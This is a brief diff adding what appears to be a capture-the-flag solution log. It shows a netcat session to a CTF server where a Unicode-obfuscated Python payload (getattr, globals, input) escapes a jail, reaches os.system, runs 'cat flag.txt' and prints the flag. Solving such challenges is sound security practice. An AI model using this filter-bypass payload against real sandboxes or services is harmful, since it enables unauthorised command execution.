@@ -1,0 +1,9 @@
+$ nc playground.tcp1p.team 8011
+Input plsｇｅｔａｔｔｒ(ｇｅｔａｔｔｒ(ｇｌｏｂａｌｓ()[𝘪𝘯𝘱𝘶𝘵()], 𝘪𝘯𝘱𝘶𝘵())(𝘪𝘯𝘱𝘶𝘵()), 𝘪𝘯𝘱𝘶𝘵())(𝘪𝘯𝘱𝘶𝘵())
+__builtins__
+__import__
+os
+system
+cat flag.txt
+RAMADAN{well_ada_banyak_cara_buat_ngesolve_ni_soal}
+0
